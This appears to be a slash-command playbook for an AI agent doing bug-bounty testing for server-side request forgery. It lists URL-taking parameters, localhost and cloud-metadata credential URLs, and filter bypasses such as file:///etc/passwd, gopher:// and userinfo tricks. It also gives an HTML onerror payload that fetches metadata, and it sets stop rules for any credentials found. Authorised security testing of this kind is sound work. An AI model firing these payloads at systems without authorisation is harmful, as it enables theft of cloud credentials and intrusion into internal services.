---
description: Hunt server-side request forgery — prove the fetch, reach localhost, then metadata.
argument-hint: <host> [param]
allowed-tools: Bash, Read, Write, WebFetch
---

# /bbw-ssrf

`references/08`, `workflows/05`, `checklists/ssrf.md`.

**Input:** `$ARGUMENTS` — host, optionally the parameter you already suspect.

```
/bbw-ssrf https://app.acme.com
/bbw-ssrf https://app.acme.com avatar_url
```

---

## Step 1 — Find the sinks

Grep the JS and the traffic for parameters that take a URL:

```
url uri link src dest target redirect callback webhook import fetch
image avatar preview screenshot pdf export feed rss sitemap proxy oembed
page_url context_url return returnUrl next continue
```

Also: "import from URL", "connect your account", webhook config, PDF/HTML
renderers, image resizers, link previews, SSO metadata import.

Write `sinks.tsv`: endpoint, param, method, JSON path.

## Step 2 — Listener up

One `interactsh` (or Burp Collaborator) domain per engagement. Note it in `notes.md`.

## Step 3 — Prove the fetch (the only real test)

Submit your listener URL to each sink:

```
http://<id>.oast.fun/x
```

| What you see | Verdict |
|---|---|
| hit from a datacenter IP with a server User-Agent | server-side fetch — continue |
| hit from your own browser IP | client-side only — different bug |
| no hit | stored but not fetched → **not SSRF**, say so and drop it |

A `page_url` that is logged but never fetched is closed. This exact distinction
kills most false SSRF reports.

## Step 4 — Reach localhost

```
http://127.0.0.1/
http://127.0.0.1:80/  :8080/  :3000/  :5000/  :8000/  :9200/
http://localhost/
http://[::1]/
http://0x7f000001/
http://2130706433/
http://127.1/
http://0.0.0.0/
```

Proof is a response that is clearly internal: a service banner, an internal page
title, a JSON error from an internal app. A blank 200 is not proof.

## Step 5 — Metadata

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/  (needs header — try redirect)
http://100.100.100.200/latest/meta-data/
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure, needs header)
```

If credentials come back: **do not use them.** Redact to first/last four, name the
role, stop.

## Step 6 — Bypass filters (only if blocked)

One at a time, record which worked:

- Decimal, hex, octal, shortened IP
- `127.0.0.1.nip.io`, `127.0.0.1.sslip.io`
- Your listener 302s to the internal URL (redirect-follow bypass for IMDSv2)
- `file:///etc/passwd`, `gopher://`, `dict://`, `ftp://`
- Userinfo confusion: `http://expected.com@169.254.169.254/`
- Fragment and `#` tricks, `%2f`, double encoding

## Step 7 — Renderers get a second look

A headless browser fetching your URL runs JS:

```html
<img src=x onerror="fetch('http://169.254.169.254/latest/meta-data/')">
```

If the generator returns rendered output or screenshots you can read, an iframe
`file:///etc/passwd` is readable too.

---

## Output shape

```
sinks tested: N   fetching: N
reach: none | localhost:<port> | metadata
evidence: findings/<slug>/  (listener hit log + response)
severity: Medium (blind) | High (internal) | Critical (credentials)
next: /bbw-score then /bbw-report
```

## Stop conditions

- Everything filtered and every bypass blocked → "closed", write it, move on.
- Credentials obtained → stop immediately, do not enumerate permissions.
- Internal service found → one request to prove it, not a scan.
